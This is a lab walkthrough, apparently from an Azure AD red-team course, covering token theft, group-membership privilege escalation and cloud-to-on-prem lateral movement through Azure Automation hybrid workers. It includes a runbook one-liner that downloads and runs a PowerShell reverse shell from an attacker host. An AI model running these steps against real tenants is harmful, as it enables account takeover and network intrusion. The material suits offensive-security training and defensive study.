# Authenticated Enumeration 
## Authenticated Enumeration, Privilege Escalation and Cloud to On-Prem Lateral Movement

***Part of - Kill Chain - 1***
***Topics covered - Authenticated Enumeration, Privilege Escalation and Cloud to On-Prem Lateral Movement***

## PART I - Abuse Pwned User Permissions

  <!---objective 14 -->
1. Get a reverse shell on VM
2. List signed in users as the following command and enumerate the users.
    ```powershell
    az ad signed-in-user show
    ```
    ![test](/img/lateral.png "Lateral Movement")
4. Use `az automation account list` command to get information on automation accounts. However it needs automation extension and we may need to run the following commands.
    ```powershell
    az extension add --upgrade -n automation
    az automation account list
    ```
5. Check the objects owned by pwned user. 
    ```powershell
    az ad signed-in-user list-owned-objects
    ```
    ![test](/img/lateral_2.png "Lateral Movement")
6. To be able to interact with Azure AD, request a token for the aad-graph. We can use that token with the Azure AD module. Run the below command on the reverse shell:
    ```powershell
    az account get-access-token --resource-type aad-graph
    ```
    ![test](/img/lateral_3.png "Lateral Movement")
7. To get `AccountId` parameter
    ```powershell
    az ad signed-in-user show
    ```
    ![test](/img/lateral_4.png "Lateral Movement")
8. After getting `$AADToken`, `$tenant_id` and `$account_id` connect via `Connect-AzureAD`
    ```powershell
    Connect-AzureAD -AadAccessToken $AADToken -TenantId $tenant_id -AccountId $account_id
    ```
9. Add the compromised user as a member of the group to automation group via `-ObjectID` is for the Group and `-RefObjectId` is of pwned user.
    ```powershell
    Add-AzureADGroupMember -ObjectId e6870783-1378-4078-b242-84c08c6dc0d7 -RefObjectId f66e133c-bd01-4b0b-b3b7-7cd949fd45f3 -Verbose
    ```
10. Check automation accounts 
    ```powershell
    az automation account list
    ```
    ![test](/img/lateral_5.png "Lateral Movement")
11. List role assigned pwned user via below command;
    ```powershell
    az role assignment list --assignee <username>@<domain>.onmicrosoft.com
    ```
12. Request an access token for `ARM`;
    ```powershell
    az account get-access-token
    ```
13. Connect via `Connect-AzAccount` 
    ```powershell
    Connect-AzAccount -Accesstoken $AccesssToken -GraphAccessToken $AADToken -AccountId $account_id
    ```
    ![test](/img/lateral_6.png "Lateral Movement")



## Part II - Lateral Movement
1. Get role assignment for the pwned user;
    ```powershell
    Get-AzRoleAssignment -Scope /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Automation/automationAccounts/HybridAutomation
    ```
    ![test](/img/lateral_7.png "Lateral Movement")
2. Use the below command to check if a hybrid worker group is in user by the automation account.
    ```powershell
    Get-AzAutomationHybridWorkerGroup -AutomationAccountName HybridAutomation -ResourceGroupName Engineering
    ```
3. Modify the reverse shell script;
    ```powershell
    powershell "IEX (New-Object Net.Webclient).downloadstring('http://172.16.150.31:82/Invoke-PowerShellTcp.ps1');Power -Reverse -IPAddress 172.16.150.31 -Port 4444"
    ```
4. Import, publish and start the runbook script as remote via below command;
    **Import Runbook**
    ```powershell
    Import-AzAutomationRunbook -Name student31 -Path C:\AzAD\Tools\student31.ps1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Type PowerShell -Force -Verbose
    ```
    ![test](/img/lateral_8.png "Lateral Movement")

    **Publish Runbook**
    ```powershell
    Publish-AzAutomationRunbook -RunbookName student31 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
    ```

    **Start a listener with netcat**
    ![test](/img/lateral_9.png "Lateral Movement")


    **Start Runbook**
    ```powershell
    Start-AzAutomationRunbook -RunbookName student31 -RunOn Workergroup1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
    ```

    **Got the reverse shell**
    ![test](/img/lateral_10.png "Lateral Movement")